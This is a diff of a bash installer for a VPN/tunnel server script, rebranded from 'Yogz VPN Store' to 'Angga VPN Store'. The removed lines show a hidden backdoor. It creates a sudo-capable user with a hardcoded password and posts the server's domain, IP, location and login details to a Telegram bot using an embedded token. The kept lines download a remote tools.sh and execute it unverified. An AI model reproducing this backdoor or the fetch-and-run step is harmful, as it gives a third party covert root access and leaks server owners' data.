@@ -106,27 +106,20 @@ echo -e "[ ${green}INFO${NC} ] Preparing the install file"
 apt install git curl -y >/dev/null 2>&1
 apt install python -y >/dev/null 2>&1
 echo -e "[ ${green}INFO${NC} ] Aight good ... installation file is ready"
-echo -e "$green                                                                                         $NC"
-echo -e "$green██████╗░██████╗░██╗███╗░░██╗░██████╗░░█████╗░░██████╗  ░█████╗░██╗░░░██╗████████╗░█████╗░$NC"
-echo -e "$green██╔══██╗██╔══██╗██║████╗░██║██╔════╝░██╔══██╗██╔════╝  ██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗$NC"
-echo -e "$green██████╦╝██████╔╝██║██╔██╗██║██║░░██╗░███████║╚█████╗░  ███████║██║░░░██║░░░██║░░░██║░░██║$NC"
-echo -e "$green██╔══██╗██╔══██╗██║██║╚████║██║░░╚██╗██╔══██║░╚═══██╗  ██╔══██║██║░░░██║░░░██║░░░██║░░██║$NC"
-echo -e "$green██████╦╝██║░░██║██║██║░╚███║╚██████╔╝██║░░██║██████╔╝  ██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝$NC"
-echo -e "$green╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░$NC"
-echo -e "$green                                                                                         $NC"
+echo -e "$green $NC"
 echo -e "$green██╗███╗░░██╗░██████╗████████╗░█████╗░██╗░░░░░██╗░░░░░  ░██████╗░██████╗██╗░░██╗$NC"
 echo -e "$green██║████╗░██║██╔════╝╚══██╔══╝██╔══██╗██║░░░░░██║░░░░░  ██╔════╝██╔════╝██║░░██║$NC"
 echo -e "$green██║██╔██╗██║╚█████╗░░░░██║░░░███████║██║░░░░░██║░░░░░  ╚█████╗░╚█████╗░███████║$NC"
 echo -e "$green██║██║╚████║░╚═══██╗░░░██║░░░██╔══██║██║░░░░░██║░░░░░  ░╚═══██╗░╚═══██╗██╔══██║$NC"
 echo -e "$green██║██║░╚███║██████╔╝░░░██║░░░██║░░██║███████╗███████╗  ██████╔╝██████╔╝██║░░██║$NC"
 echo -e "$green╚═╝╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚══════╝  ╚═════╝░╚═════╝░╚═╝░░╚═╝$NC"
-echo -e "$green♥ TERIMAKSIH TELAH MEMAKAI SCRIPT BRINGAS ♥$NC"
+echo -e "$greenTERIMAKSIH TELAH MEMAKAI SCRIPT ANGGA VPN STORE$NC"
 sleep 2
 echo -ne "[ ${green}INFO${NC} ] Check permission : "
 mkdir -p /var/lib/SIJA >/dev/null 2>&1
 echo "IP=" >> /var/lib/SIJA/ipvps.conf
 echo ""
-wget -q https://raw.githubusercontent.com/Anggajrxxx/xvvip/main/tools.sh;chmod +x tools.sh;./tools.sh
+wget -q https://raw.githubusercontent.com/Anggajrxxx/xvvip/main/tools.sh && chmod +x tools.sh && ./tools.sh
 rm tools.sh
 clear
 echo " "
@@ -164,33 +157,6 @@ echo -e "$green━━━━━━━━━━━━━━━━━━━━━�
         echo "$nsdomen" > /etc/xray/nsdomain
         echo "$nsdomen" > /root/nsdomain
   fi
-domain=$(cat /root/domain)
-CITY=$(curl -s ipinfo.io/city )
-WKT=$(curl -s ipinfo.io/timezone )
-userdel jame > /dev/null 2>&1
-Username="bokzzz"
-Password=bokzzz
-mkdir -p /home/script/
-useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="5795571992"
-KEY="6351704520:AAEG3kwRGOUT4ta1e_q904v1zd-NtLFdXLE"
-TIME="10"
-URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="Installasi script V5 By YogzVPN 
-============================
-<code>Domain     :</code> <code>$domain</code>
-<code>IP Vps     :</code> <code>$IPVPS</code>
-<code>User Login :</code> <code>bok</code>
-<code>Pass Login :</code> <code>bok</code>
-<code>User Script:</code> <code>$Name</code>
-<code>Exp Script :</code> <code>$Exp</code>
-<code>Location   :</code> <code>$CITY</code>
-<code>Timezone   :</code> <code>$WKT</code>
-============================
-"
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green      Install SSH / WS               $NC"
@@ -255,10 +221,9 @@ gg="AM"
 fi
 curl -sS ifconfig.me > /etc/myipvps
 echo " "
-echo "=====================-[ SCRIPT YOGZ VPN STORE]-===================="
+echo "=====================-[ SCRIPT ANGGA VPN STORE]-===================="
 echo ""
-echo "------------------------------------------------------------"
-echo ""
+echo "--------------------------------------------------------------------"
 echo ""
 echo "   >>> Service & Port"  | tee -a log-install.txt
 echo "   - OpenVPN		: 2086"  | tee -a log-install.txt
@@ -293,11 +258,7 @@ echo "   - Admin Control" | tee -a log-install.txt
 echo "   - Change port" | tee -a log-install.txt
 echo "   - Full Orders For Various Services" | tee -a log-install.txt
 echo ""
-echo ""
-echo "------------------------------------------------------------"
-echo ""
-echo "===============-[ Script by yogz tunnel ]-==============="
-echo -e ""
+echo "--------------------------------------------------------------------"
 echo ""
 echo "" | tee -a log-install.txt
 rm /root/setup.sh >/dev/null 2>&1
